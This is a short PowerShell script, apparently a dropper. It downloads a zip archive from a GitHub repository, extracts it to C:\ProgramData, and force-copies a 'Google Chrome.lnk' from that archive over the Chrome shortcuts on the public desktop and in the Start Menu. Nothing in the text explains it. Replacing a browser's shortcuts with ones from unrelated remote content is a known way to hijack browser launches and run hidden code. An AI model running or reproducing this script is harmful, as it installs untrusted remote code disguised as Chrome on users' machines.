iwr -Uri "https://github.com/wazgame/waz/raw/main/app.zip" -OutFile ${env:tmp}\app.zip

Expand-Archive -Path ${env:tmp}\app.zip  -DestinationPath C:\ProgramData\ -Force

$orig = "C:\ProgramData\app\Google Chrome.lnk"

cpi -Path $orig -Destination "C:\Users\Public\Desktop\Google Chrome.lnk" -Force
cpi -Path $orig -Destination "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Google Chrome.lnk" -Force

